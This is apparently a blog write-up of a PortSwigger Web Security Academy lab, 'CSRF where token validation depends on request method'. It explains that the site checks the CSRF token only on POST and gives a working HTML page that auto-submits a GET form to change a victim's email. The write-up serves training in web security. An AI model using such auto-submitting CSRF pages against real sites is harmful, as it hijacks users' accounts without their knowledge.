+++
date = '2026-06-04T13:44:16+08:00'
draft = false
title = "CSRF where token validation depends on request method | <span style=\"color:#3498db\">Practitioner</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
Upon viewing the page source, the form correctly asks for the CSRF token when the request uses the POST method. But the one for GET is nowhere to be found.
![](/images/f45f63f1-0c80-439d-9aa1-0040bf5ed123.jpg)

We can just change our existing payload to use GET instead of POST as follow:
```html
<html>
<body>

<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="GET" id="attack">
<input type="hidden" name="email" value="super-ultimate-hacker@leet-hacker.net">
</form>

<script>
document.getElementById("attack").submit();
</script>

</body>
</html>
```